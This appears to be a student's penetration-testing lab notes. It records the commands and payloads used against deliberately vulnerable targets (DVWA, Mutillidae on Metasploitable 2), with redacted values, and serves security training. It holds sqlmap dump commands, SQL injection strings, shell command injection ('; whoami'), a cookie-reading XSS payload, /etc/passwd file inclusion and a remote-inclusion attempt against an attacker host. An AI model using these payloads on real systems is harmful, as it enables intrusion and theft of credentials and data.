# Commands Used – Web Application Penetration Testing (OWASP Top 10)

## Overview

This document records the commands, tool configurations, and payload structures used during Week 4, organized by tool and attack phase. Sensitive values such as session identifiers, credentials, database contents, and host-specific addresses have been replaced with placeholders. Payload structure and syntax are preserved so the technique can be reproduced in an authorized lab.

Placeholders used throughout:
- `<TARGET_IP>`: the lab target address (Metasploitable 2)
- `<SESSION_ID>`: a session cookie value
- `<ATTACKER_IP>`: the attacker machine address on the lab network

---

# 1. Docker

## Purpose

Deploy DVWA (Damn Vulnerable Web Application) as a containerized target for OS Command Injection testing, without requiring pre-installation on Metasploitable 2.

### Command

```bash
docker pull vulnerables/web-dvwa
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa
docker ps
```

### Expected Output

The `docker ps` output shows the DVWA container running with its port mapped to `0.0.0.0:8081->80/tcp`.

### Why It Was Used

DVWA was not pre-installed on Metasploitable 2 and required a fresh Docker deployment for the OS Command Injection exercise. Running it in a container isolates the vulnerable application from the host and provides a consistent configuration (Script Security set to Low).

### Evidence

Figure 4.1: `docker ps` confirming the DVWA container running and mapped to `0.0.0.0:8081->80/tcp`

---

# 2. Network Configuration and Validation

## Purpose

Verify the dual-adapter network configuration (host-only adapter for lab target reachability, NAT adapter for internet access) and confirm connectivity needed for the Docker image pull.

### Command

```bash
ping -c 3 8.8.8.8
ping -c 3 google.com
```

### Expected Output

Three successful ICMP replies from each destination with 0% packet loss.

### Why It Was Used

The initial host-only adapter configuration provided reachability to the lab target but no internet route, which blocked DNS resolution during `docker pull`. A second NAT adapter restored internet access without disrupting target reachability. These two pings verified the configuration before retrying the pull.

### Evidence

Figure 4.0: `ip a` output confirming dual-adapter configuration and successful internet connectivity test

---

# 3. SQLMap

## Purpose

Automate SQL injection detection, DBMS fingerprinting, and data extraction. SQLMap applies the same techniques performed manually (boolean-based, error-based, UNION-based, time-based) at greater speed and thoroughness.

### Base Command Structure

```bash
sqlmap -u "http://<TARGET_IP>/mutillidae/index.php?page=user-info.php&username=<USERNAME>&password=<PASSWORD>&user-info-php-submit-button=View+Account+Details" \
  --cookie="PHPSESSID=<SESSION_ID>" \
  <ENUMERATION_FLAG>
```

The base command is the same for each stage. Only the enumeration flag changes.

### Stage 1: Database Enumeration

```bash
sqlmap ... --dbs
```

**Result:** Injection confirmed through boolean-based blind, error-based (FLOOR), and time-based blind (SLEEP) techniques. Seven databases enumerated, including the target application database.

**Evidence:** Figures 4.21a and 4.21b

### Stage 2: Table Enumeration

```bash
sqlmap ... -D <DATABASE> --tables
```

**Result:** Six tables enumerated within the application database, including `accounts`, `credit_cards`, and `captured_data`.

**Evidence:** Figure 4.22

### Stage 3: Column Enumeration

```bash
sqlmap ... -D <DATABASE> -T accounts --columns
```

**Result:** Five columns enumerated: an integer identifier, username, password (text type), a signature field, and an `is_admin` flag.

**Evidence:** Figures 4.23a and 4.23b

### Stage 4: Data Extraction

```bash
sqlmap ... -D <DATABASE> -T accounts --dump
```

**Result:** All 19 rows extracted. Passwords were stored in plaintext for every account. Credential values are not reproduced in this repository.

**Critical Finding:** Plaintext credential storage is a standalone, severe issue independent of the SQL injection vulnerability.

**Evidence:** Figures 4.24a and 4.24b (credential values redacted in the repository copy)

---

# 4. Manual SQL Injection Payloads (Burp Suite Repeater)

## Purpose

Build a working understanding of SQL injection by progressing manually from syntax error detection to boolean-based logic confirmation to UNION-based extraction. Manual testing is essential when automated tooling is blocked or fails.

### Step 1: Syntax Error Detection

Append a single quote to the username parameter:
username=<USERNAME>‘

**Expected behavior:** A MySQL syntax error is returned in the response, confirming that user input reaches the query unparameterized.

**Evidence:** Figure 4.14

### Step 2: Boolean-Based Logic Confirmation
username=<USERNAME>‘ AND ‘1’='1
username=<USERNAME>‘ AND ‘1’='2

**Expected behavior:** The true condition returns full record data. The false condition returns an empty response with the connection closed.

**Evidence:** Figure 4.15

### Step 3: Column Count Enumeration (ORDER BY)
username=<USERNAME>‘ ORDER BY 1-- -
username=<USERNAME>‘ ORDER BY 5-- -
username=<USERNAME>‘ ORDER BY 6-- -

**Expected behavior:** Orders 1 through 5 succeed. `ORDER BY 6` returns "Unknown column '6' in 'order clause'", confirming a five-column query.

**Evidence:** Figures 4.16a, 4.16b, and 4.17

### Step 4: UNION Column Mapping
username=<USERNAME>‘ UNION SELECT 1,2,3,4,5-- -

**Expected behavior:** Injected placeholder values appear in the output fields. Columns 2, 3, and 4 are visible in the page.

**Evidence:** Figure 4.19

### Step 5: Database Reconnaissance
username=<USERNAME>‘ UNION SELECT 1,database(),user(),version(),5-- -

**Expected behavior:** The database name, current database user, and MySQL version are returned in the visible fields.

**Result:** Database name, database account, and version were extracted. The database account was over-privileged, and the MySQL version is end-of-life. Specific values are redacted here.

**Evidence:** Figure 4.20 (values redacted in the repository copy)

---

# 5. OS Command Injection Payloads (DVWA)

## Purpose

Demonstrate that unvalidated input passed to a shell command (for example, `ping -c 4 <input>`) can be extended with additional commands through shell separators, enabling remote command execution.

### Step 1: Baseline
127.0.0.1

**Expected behavior:** Normal ping output.

**Evidence:** Figure 4.25

### Step 2: Separator with Leading Space (No Visible Injection)
127.0.0.1 ; whoami

**Expected behavior:** Ping output only. No injected output appeared.

### Step 3: Separator without Leading Space (Injection Confirmed)
127.0.0.1; whoami

**Expected behavior:** Ping output followed by the `whoami` result, `www-data`, confirming execution in the web server's privilege context.

**Evidence:** Figure 4.26

### Step 4: Directory Listing
127.0.0.1; ls

**Expected behavior:** Ping output followed by a directory listing of the application root.

**Evidence:** Figure 4.27

---

# 6. Reflected XSS Payload (Burp Suite)

## Purpose

Demonstrate that input echoed into the HTML response without output encoding executes as JavaScript in the victim's browser, enabling session hijacking.

### Payload

```html
<script>alert(document.cookie)</script>
```

**Expected behavior:** A popup displays the session cookie value. Session values are redacted in this repository.

**Why It Was Used:** The popup confirms that `document.cookie` is accessible to injected script. An attacker would replace `alert()` with a request that sends the cookie to an attacker-controlled endpoint.

**Evidence:** Figure 4.31

---

# 7. Local File Inclusion Payload (Burp Suite)

## Purpose

Demonstrate that an unsanitized page parameter passed to a PHP include call allows reading arbitrary files from the server.

### Payload
index.php?page=/etc/passwd

**Expected behavior:** The server returns the contents of the system user file. Account entries are not reproduced in this repository.

**Why It Was Used:** Confirms arbitrary local file read. Exposed system accounts support further attack planning in a real assessment.

**Evidence:** Figure 4.32

---

# 8. Remote File Inclusion Attempt

## Purpose

Test whether the application fetches and executes remote files via include(). This also validates a configuration-level defense.

### Step 1: Host a Test File

```bash
python3 -m http.server 8000
```

Serves a test file from the attacker machine on the lab network.

### Step 2: Remote Inclusion Attempt
index.php?page=http://<ATTACKER_IP>:8000/test.txt

**Expected behavior (observed):** PHP returns a warning that URL file access is disabled in the server configuration. The include is blocked before any remote content is fetched.

**Evidence:** Figure 4.33

---

# Command Summary

| Tool | Purpose | Command Pattern |
|------|---------|-----------------|
| Docker | Deploy DVWA | `docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa` |
| Network | Verify dual-adapter configuration | `ping -c 3 8.8.8.8` |
| SQLMap | Enumerate and extract database content | `sqlmap -u "<URL>" --cookie="PHPSESSID=<SESSION_ID>" --dbs / --tables / --columns / --dump` |
| Burp Suite Repeater | Manual SQL injection | `' AND '1'='1`, `ORDER BY n`, `UNION SELECT` |
| Burp Suite Intruder | Response-length-based credential testing | Sniper attack, password payload position |
| DVWA | OS command injection | `127.0.0.1; whoami` |
| Burp Suite | Reflected XSS | `<script>alert(document.cookie)</script>` |
| Burp Suite | Local file inclusion | `index.php?page=/etc/passwd` |
| Python HTTP server | Host RFI test file | `python3 -m http.server 8000` |

---

# Key Takeaway

Commands in this engagement progressed from infrastructure validation (ping, Docker) through injection technique escalation (manual SQL payloads, then SQLMap automation) to command chaining (shell separators) and client- and server-side code execution (XSS, LFI). Real penetration testing combines manual technique-building, which builds understanding of the vulnerability, with automated tooling, which provides scale. Each validates the other.

Small syntax differences matter. A space before the semicolon in the command injection payload produced no visible effect, while the space-free variant succeeded. Retesting with slight variations is disciplined methodology, not repeated guessing.

Infrastructure-level hardening (`allow_url_include=Off`) blocked the RFI half of an otherwise exploitable LFI vulnerability. This negative result is as important to document as the positive findings, because it shows that not every vulnerability leads to full compromise when additional controls are in place.

---
